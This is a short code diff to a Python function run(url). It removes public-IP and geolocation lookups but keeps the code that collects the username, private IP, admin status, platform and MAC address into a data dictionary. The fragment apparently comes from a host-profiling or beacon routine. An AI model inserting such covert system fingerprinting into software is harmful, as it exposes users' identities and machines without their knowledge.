@@ -85,27 +85,6 @@ def run(url):
             return False
     
     
-    # Get public IP address
-    try:
-        public_ip = requests.get('https://api.ipify.org').text
-    except:
-        public_ip = 'Unknown'
-    
-    # Get geolocation
-    try:
-        geo = geocoder.ip('me')
-        geolocation = {
-            'latitude': geo.latlng[0],
-            'longitude': geo.latlng[1],
-            'address': geo.address
-        }
-    except:
-        geolocation = {
-            'latitude': 'Unknown',
-            'longitude': 'Unknown',
-            'address': 'Unknown'
-        }
-    
     # Get username
     username = getpass.getuser()
     
@@ -120,9 +99,7 @@ def run(url):
     mac = get_mac()
     
     data = {
-        'public_ip': public_ip,
         'private_ip': get_ip(),
-        'geolocation': geolocation,
         'username': username,
         'permissions': is_admin(),
         'platform': platform_info,
